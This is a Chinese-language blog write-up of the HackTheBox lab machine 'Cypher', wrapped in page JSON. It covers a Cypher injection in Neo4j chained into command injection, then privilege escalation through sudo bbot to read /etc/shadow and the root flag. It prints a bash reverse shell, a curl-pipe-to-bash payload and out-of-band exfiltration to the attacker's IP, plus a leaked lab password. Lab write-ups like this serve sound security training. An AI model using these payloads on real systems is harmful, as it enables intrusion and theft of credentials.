{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Cypher","contentHtml":"<h1>Season7-Cypher</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Cypher\">https://app.hackthebox.com/machines/Cypher</a> | <code>Linux · Medium</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<p><code>10.10.11.57</code> 是靶机</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -min-rate 10000 -p- 10.10.11.57              \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.57\nHost is up (0.13s latency).\nNot shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.15 seconds\n</code></pre>\n<p>发现域名 <code>http://cypher.htb/</code> 添加到<code>hosts</code>文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -A -T4 -O -p 22,80 10.10.11.57               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.57\nHost is up (0.25s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\n|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://cypher.htb/\n|_http-server-header: nginx/1.24.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   502.38 ms 10.10.16.1\n2   586.07 ms 10.10.11.57\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 43.03 seconds\n</code></pre>\n<p>扫描<code>UDP</code>端口</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  nmap -sU -min-rate 10000 -p- cypher.htb \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\nNmap scan report <span class=\"hljs-keyword\">for</span> cypher.htb (10.10.11.57)\nHost is up (4.6s latency).\nNot shown: 65517 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n476/udp   closed tn-tl-fd1\n5749/udp  closed unknown\n16119/udp closed unknown\n16380/udp closed unknown\n16424/udp closed unknown\n32237/udp closed unknown\n33895/udp closed unknown\n39619/udp closed unknown\n40153/udp closed unknown\n42240/udp closed unknown\n42704/udp closed unknown\n45096/udp closed unknown\n53762/udp closed unknown\n55811/udp closed unknown\n56083/udp closed unknown\n59387/udp closed unknown\n60627/udp closed unknown\n62347/udp closed unknown\n</code></pre>\n<p>扫描一下子域名</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H <span class=\"hljs-string\">'Host:FUZZ.cypher.htb'</span> -u http://cypher.htb                               \n\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://cypher.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                       \n=====================================================================\n\nTotal <span class=\"hljs-keyword\">time</span>: 199.7973\nProcessed Requests: 4989\nFiltered Requests: 4989\nRequests/sec.: 24.97030\n</code></pre>\n<p>访问<code>HTTP</code>主页，这个动画效果将我的<code>Kali</code>击碎</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image27.png\" alt=\"image.png\"></p>\n<p>貌似在登录框存在<code>SQL</code>注入，使用<code>SQLMAP</code>和手动注入无果</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image28.png\" alt=\"image.png\"></p>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt\n\nTarget: http://cypher.htb/\n\n[08:33:32] Starting: \n[08:33:56] 200 -    5KB - /about\n[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api\n[08:34:17] 307 -    0B  - /api  ->  /api/docs\n[08:34:42] 307 -    0B  - /demo  ->  /login\n[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo\n[08:35:10] 200 -    4KB - /login\n[08:35:10] 200 -    4KB - /login.html\n[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/\n</code></pre>\n<p>发现新目录<code>testing</code> ，访问下载了<code>jar</code>文件</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image29.png\" alt=\"image.png\"></p>\n<h2>反编译 jar</h2>\n<p>将<code>jar</code>文件下载下来，使用<code>jd-gui</code>反编译</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image30.png\" alt=\"image.png\"></p>\n<p>在其中发现貌似可以命令执行地方</p>\n<pre><code class=\"hljs language-bash\">String[] <span class=\"hljs-built_in\">command</span> = { <span class=\"hljs-string\">\"/bin/sh\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \"</span> + url };\n</code></pre>\n<p>丢到<code>GPT</code>里进行分析：</p>\n<ul>\n<li>\n<p>该 Java 代码是 Neo4j 自定义 APOC（Awesome Procedures on Cypher）扩展的一部分，提供 <code>custom.getUrlStatusCode</code> 过程。</p>\n</li>\n<li>\n<p>该过程接收一个 URL，使用 <code>curl</code> 命令获取其 HTTP 状态码，并返回。</p>\n</li>\n<li>\n<p><strong>攻击示例执行效果</strong>这会导致服务器泄露敏感文件 <code>/etc/passwd</code>。</p>\n<pre><code class=\"hljs language-vbnet\"><span class=\"hljs-keyword\">CALL</span> <span class=\"hljs-keyword\">custom</span>.getUrlStatusCode(<span class=\"hljs-string\">\"https://example.com; cat /etc/passwd\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; <span class=\"hljs-built_in\">cat</span> /etc/passwd\n</code></pre>\n</li>\n</ul>\n<h2>Cypher Injection</h2>\n<p>看到<code>neo4j</code>才发现上面的压根不是<code>SQL</code>注入 <a href=\"https://neo4j.com/docs/getting-started/cypher/\">https://neo4j.com/docs/getting-started/cypher/</a></p>\n<blockquote>\n<p>Cypher is Neo4j’s declarative and GQL conformant query language. Available as open source via The openCypher project, Cypher is similar to SQL, but optimized for graphs. | Cypher 是 Neo4j 的声明式和符合 GQL 的查询语言。Cypher 可通过openCypher 项目以开源形式获得，它类似于 SQL，但针对图形进行了优化。</p>\n</blockquote>\n<p>尝试了使用<code>cyphermap</code>但是始终返回<code>Unable to find valid injection type...</code></p>\n<p>通过 ：<a href=\"https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection\">https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection</a> 可以了解到<code>Cypher</code>注入</p>\n<p>随便输入点东西可以在错误中发现查询语句</p>\n<pre><code class=\"hljs language-bash\">{message: Variable `c` not defined (line 1, column 75 (offset: 74))\n<span class=\"hljs-string\">\"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash\"</span>\n                                                                           ^}\n</code></pre>\n<p>成功闭合</p>\n<pre><code class=\"hljs language-bash\">{<span class=\"hljs-string\">\"username\"</span>:<span class=\"hljs-string\">\"admin' or 1=1 return h.value as hash//\"</span>,<span class=\"hljs-string\">\"password\"</span>:<span class=\"hljs-string\">\"1\"</span> }\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image31.png\" alt=\"image.png\"></p>\n<p>带外测试</p>\n<pre><code class=\"hljs language-bash\">{<span class=\"hljs-string\">\"username\"</span>:<span class=\"hljs-string\">\"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//\"</span>,<span class=\"hljs-string\">\"password\"</span>:<span class=\"hljs-string\">\"1\"</span> }\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image32.png\" alt=\"image.png\"></p>\n<p>然后可以通过<code>custom</code> 用来引用自定义的程序或函数，也就是上面带有命令执行的方法 <a href=\"https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/\">https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/</a></p>\n<p>成功带外，但是无回显</p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"username\"</span>:<span class=\"hljs-string\">\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;whoami\\\") YIELD statusCode AS a RETURN a;//\"</span>,\n\t<span class=\"hljs-string\">\"password\"</span>:<span class=\"hljs-string\">\"1\"</span> \n}\n</code></pre>\n<p>构造<code>payload</code></p>\n<ol>\n<li>\n<p>在kali创建带有反弹shell语句的文件shell.txt（让服务器访问）</p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/10.10.16.34/1234 0>&#x26;1'</span>\n</code></pre>\n</li>\n<li>\n<p>开启监听</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  nc -lvnp 1234\nlistening on [any] 1234 ...\n</code></pre>\n</li>\n<li>\n<p>开启简易服务器</p>\n</li>\n<li>\n<p>构造<code>payload</code></p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"username\"</span>:<span class=\"hljs-string\">\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\\\") YIELD statusCode AS a RETURN a;//\"</span>,\n\t<span class=\"hljs-string\">\"password\"</span>:<span class=\"hljs-string\">\"1\"</span> \n}\n</code></pre>\n<p>成功获得<code>shell</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image33.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>提权</h2>\n<p>信息收集一波</p>\n<pre><code class=\"hljs language-bash\">neo4j@cypher:/home/graphasm$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 56\ndrwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .\ndrwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..\nlrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null\n-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout\n-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot\n-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml\ndrwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config\ndrwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .<span class=\"hljs-built_in\">local</span>\n-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile\ndrwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput\n-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt\n</code></pre>\n<p>bbot_preset.yml 得到一组账号密码</p>\n<pre><code class=\"hljs language-bash\">neo4j@cypher:/home/graphasm$ <span class=\"hljs-built_in\">cat</span> bbot_preset.yml\ntargets:\n  - ecorp.htb\n\noutput_dir: /home/graphasm/bbot_scans\n\nconfig:\n  modules:\n    neo4j:\n      username: neo4j\n      password: cU4btyib.20xtCMCXkBmerhK\n</code></pre>\n<p>但是使用<code>neo4j</code>登陆不成功，密码碰撞使用<code>graphasm</code>登陆成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/cypher  ssh graphasm@10.10.11.57                            \ngraphasm@10.10.11.57<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun Mar  2 03:13:58 PM UTC 2025\n\n  System load:  0.0               Processes:             243\n  Usage of /:   74.2% of 8.50GB   Users logged in:       1\n  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57\n  Swap usage:   0%\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 2 15:13:59 2025 from 10.10.16.34\ngraphasm@cypher:~$ \n</span></code></pre>\n<p>在家目录下可以读取<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">graphasm@cypher:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n63a155f3be93bac8eec086ec22459b65\n</code></pre>\n<p>查看graphasm用户权限</p>\n<pre><code class=\"hljs language-bash\">graphasm@cypher:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> graphasm on cypher:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser graphasm may run the following commands on cypher:\n    (ALL) NOPASSWD: /usr/local/bin/bbot\n</code></pre>\n<p>查看<code>bbot</code>帮助</p>\n<pre><code class=\"hljs language-bash\">graphasm@cypher:~$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/bbot   \n  ______  _____   ____ _______               \n |  ___ \\|  __ \\ / __ \\__   __|                                                                                                                                                                                    \n | |___) | |__) | |  | | | |                                                                             \n |  ___ &#x3C;|  __ &#x3C;| |  | | | |                  \n | |___) | |__) | |__| | | |                                                                             \n |______/|_____/ \\____/  |_|                                                                             \n BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    \n                                                                                                         \nwww.blacklanternsecurity.com/bbot                                                                        \n                                                                                                         \nusage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]\n            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]\n            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]\n            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]\n                                                    \nBighuge BLS OSINT Tool                                                                                   \n                                                                                                         \noptions:                                                                                                 \n  -h, --<span class=\"hljs-built_in\">help</span>            show this <span class=\"hljs-built_in\">help</span> message and <span class=\"hljs-built_in\">exit</span>\n                                                                                                         \nTarget:                \n  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             \n                        Targets to seed the scan\n  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]\n                        What<span class=\"hljs-string\">'s considered in-scope (by default it'</span>s the same as --targets)\n  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]\n                        Don<span class=\"hljs-string\">'t touch these things                                                         \n  --strict-scope        Don'</span>t consider subdomains of target/whitelist to be in-scope                                                                                                                               \n                                                                                                         \nPresets:                                           \n  -p [PRESET ...], --preset [PRESET ...]                                                                 \n                        Enable BBOT preset(s)                                                            \n  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           \n                        Custom config options <span class=\"hljs-keyword\">in</span> key=value format: e.g. <span class=\"hljs-string\">'modules.shodan.api_key=1234'</span>    \n  -lp, --list-presets   List available presets.     \n                                                                                                         \nModules:                                                                                                 \n  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  \n                        Modules to <span class=\"hljs-built_in\">enable</span>. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre\ndshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle\ntters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i\nis_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get\nparams,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke\n,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             \n  -l, --list-modules    List available modules.                                                                                                                                                                    \n  -lmo, --list-module-options                                                                            \n                        Show all module config options        \n  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         \n                        Exclude these modules.\n  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]\n                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,\ndeadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         \n  -lf, --list-flags     List available flags. \n  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   \n                        Only <span class=\"hljs-built_in\">enable</span> modules with these flags (e.g. -rf passive)                          \n  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   \n                        Disable modules with these flags. (e.g. -ef aggressive)                          \n  --allow-deadly        Enable the use of highly aggressive modules                                      \n                                                                                                         \nScan:                                                                                                                                                                                                              \n  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   \n                        Name of scan (default: random)                                                                                                                                                             \n  -v, --verbose         Be more verbose                                                                                                                                                                            \n  -d, --debug           Enable debugging            \n  -s, --silent          Be quiet                                                                         \n  --force               Run scan even <span class=\"hljs-keyword\">in</span> the <span class=\"hljs-keyword\">case</span> of condition violations or failed module setups        \n  -y, --<span class=\"hljs-built_in\">yes</span>             Skip scan confirmation prompt                                                    \n  --dry-run             Abort before executing scan                                                      \n  --current-preset      Show the current preset <span class=\"hljs-keyword\">in</span> YAML format                                           \n  --current-preset-full\n                        Show the current preset <span class=\"hljs-keyword\">in</span> its full form, including defaults\n                                                    \nOutput:                                                                                                  \n  -o DIR, --output-dir DIR                                                                               \n                        Directory to output scan results             \n  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          \n                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         \n  --json, -j            Output scan data <span class=\"hljs-keyword\">in</span> JSON format   \n  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            \n                        Choose <span class=\"hljs-built_in\">which</span> event types to display                                              \n                                                                                                                                                                                                                   \nModule dependencies:                                                                                     \n  Control how modules install their dependencies    \n                                                                                                         \n  --no-deps             Don<span class=\"hljs-string\">'t install module dependencies                                                \n  --force-deps          Force install all module dependencies                                            \n  --retry-deps          Try again to install failed module dependencies                                                                                                                                            \n  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          \n  --install-all-deps    Install dependencies for all modules                                                                                                                                                       \n                                                                                                                                                                                                                   \nMisc:                                                                                                                                                                                                              \n  --version             show BBOT version and exit                                                       \n  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     \n                        List of custom headers as key value pairs (header=value).                        \n  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES\n                        Add custom yara rules to excavate                                                \n                                                    \nEXAMPLES                                     \n                                                                                                                                                                                                                   \n    Subdomains:                                                                                          \n        bbot -t evilcorp.com -p subdomain-enum\n                                                                                                         \n    Subdomains (passive only):                                                                           \n        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               \n                                                                                                         \n    Subdomains + port scan + web screenshots:                                                            \n        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     \n                                                                                                                                                                                                                   \n    Subdomains + basic web scan:                                                                                                                                                                                   \n        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           \n                                                                                                                                                                                                                   \n    Web spider:                                     \n        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   \n                                                                                                         \n    Everything everywhere all at once:                                                                   \n        bbot -t evilcorp.com -p kitchen-sink                                                             \n                                                                                                         \n    List modules:      \n        bbot -l                                                                                          \n                                                    \n    List presets:                                                                                        \n        bbot -lp                                                                                         \n                                                                                                         \n    List flags:                                                                                          \n        bbot -lf                                                                                        \n</span></code></pre>\n<p>构造任意文件读取</p>\n<p>读取文件大点的文件，容易看见输出</p>\n<pre><code class=\"hljs language-bash\">graphasm@cypher:~$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/bbot -cy /etc/shadow -d \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image34.png\" alt=\"image.png\"></p>\n<p>读取<code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">graphasm@cypher:~$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/bbot -cy /root/root.txt -d \n</code></pre>\n<pre><code class=\"hljs language-bash\">63582a9da70699c87d6bd78e92aa9a71\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Cypher/image35.png\" alt=\"image.png\"></p>","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","updated":"2025-07-29","comments":true,"tags":["HackTheBox","Linux靶机"],"categories":"靶机","description":"Season7-Cypher\n\n https://app.hackthebox.com/machines/Cypher | `Linux · Medium`\n \n\n前期踩点\n\n`10.10.11.57` 是靶机\n\n\n\n发现域名 `http://cypher.htb/` 添加到`hosts`文件\n\n\n\n扫描`UDP`端口\n\n\n\n扫描一下子域名\n\n\n\n访问`HTTP`主页，这个动画效果将我的`Kali..."},"recentPosts":[{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"}]},"__N_SSG":true}